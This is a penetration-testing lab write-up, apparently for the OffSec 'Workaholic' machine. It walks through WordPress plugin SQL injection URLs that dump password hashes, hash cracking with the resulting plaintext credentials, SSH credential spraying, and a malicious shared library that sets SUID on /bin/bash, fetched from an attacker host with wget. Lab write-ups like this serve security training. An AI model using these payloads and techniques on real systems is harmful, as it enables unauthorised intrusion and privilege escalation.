---
icon: ubuntu
---

# Workaholic - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.229 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 17:12 EDT
Nmap scan report for 192.168.231.229
Host is up (0.031s latency).
Not shown: 65505 filtered tcp ports (no-response), 27 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Workaholic
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-generator: WordPress 6.7.2
|_http-server-header: nginx/1.24.0 (Ubuntu)
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   31.57 ms 192.168.45.1
2   31.51 ms 192.168.45.254
3   32.48 ms 192.168.251.1
4   33.28 ms 192.168.231.229
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (506).png" alt=""><figcaption></figcaption></figure>

When visiting /wp-admin we are redirected to workaholic.offsec. I'll add it to /etc/hosts

```
192.168.231.229 workaholic.offsec
```

The nmap scan revealed this is a wordpress site so I will run a wpscan

```
wpscan --url http://workaholic.offsec/ --enumerate vp,u --api-token *************** --force
```

<figure><img src="../../.gitbook/assets/image (507).png" alt=""><figcaption></figcaption></figure>

A quick search for Unauthenticated SQLI brings me to this [**website**](https://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b/)

The above site delivers us 2 sql injections that will help us dump the username and password hashes

### <mark style="color:$primary;">Wordpress Plugin -> Blind SQLI POC</mark>

```
/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20--&f=user_login&type=&e
```

<figure><img src="../../.gitbook/assets/image (508).png" alt=""><figcaption></figcaption></figure>

This sql injection delivers us the users, let's use the second payload we found and get the password hashes

```
/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20UNION%20SELECT%20user_pass%20FROM%20wp_users--&f=user_login&type=&e
```

<figure><img src="../../.gitbook/assets/image (509).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (510).png" alt=""><figcaption></figcaption></figure>

I am gonna save these to a file and try to crack them

```
john pass-hashes -w=/usr/share/wordlists/rockyou.txt 
```

<figure><img src="../../.gitbook/assets/image (511).png" alt=""><figcaption></figcaption></figure>

I was able to crack 2

```
ted:okadamat17
charlie:chrish20
```

### <mark style="color:$primary;">FTP Enumeration</mark>

ted's creds work on ftp

<figure><img src="../../.gitbook/assets/image (512).png" alt=""><figcaption></figcaption></figure>

we can access the root directory as well, let's look for some config files

<figure><img src="../../.gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>

Found wp-config.php file, in  **`/home/ted/shared`** directory

<figure><img src="../../.gitbook/assets/image (514).png" alt=""><figcaption></figcaption></figure>

```
cat wp-config.php 
```

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

We found another set of credentials in the config file. I am going to perform credentials spraying on ssh with the users and creds I found so far

<figure><img src="../../.gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Credential spraying</mark>

```
netexec ssh workaholic.offsec -u users -p passwords
```

<figure><img src="../../.gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>

We can ssh as charlie!

```
ssh charlie@workaholic.offsec
```

<figure><img src="../../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

#### Misconfigured plugin

<figure><img src="../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

Linpeas found an Unknown SUID, We can examine it to see what it does.

```
strings /var/www/html/wordpress/blog/wp-monitor
```

<figure><img src="../../.gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>

From the strings dump, this file loads a libsecurity.so file from /home/ted/.lib We might be able to leverage this by creating a malicious file that lets us escalate privileges.

Let's create a malicious shell.c file. <mark style="color:yellow;">**Note! we have to use the function name “init\_plugin”, which we see from the strings dump too.**</mark>

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int init_plugin(void){
    setuid(0); setgid(0);
    system("chmod u+s /bin/bash");
}

int main(void) {
    init_plugin();
    return 0;
}
```

Now let's create a .lib directory under /home/ted

<figure><img src="../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>

gcc is on the machine so I will compile my file there.

Now I will download the C file to the .lib directory

```
wget 192.168.45.158/shell.c
```

<figure><img src="../../.gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>

Compile the file

```
gcc -shared -fPIC -o libsecurity.so shell.c -Wl,--export-dynamic
```

<figure><img src="../../.gitbook/assets/image (524).png" alt=""><figcaption></figcaption></figure>

now run the binary

```
/var/www/html/wordpress/blog/wp-monitor
```

When the binary finishes, /bin/bash will have the SUID bit set

<figure><img src="../../.gitbook/assets/image (2495).png" alt=""><figcaption></figcaption></figure>
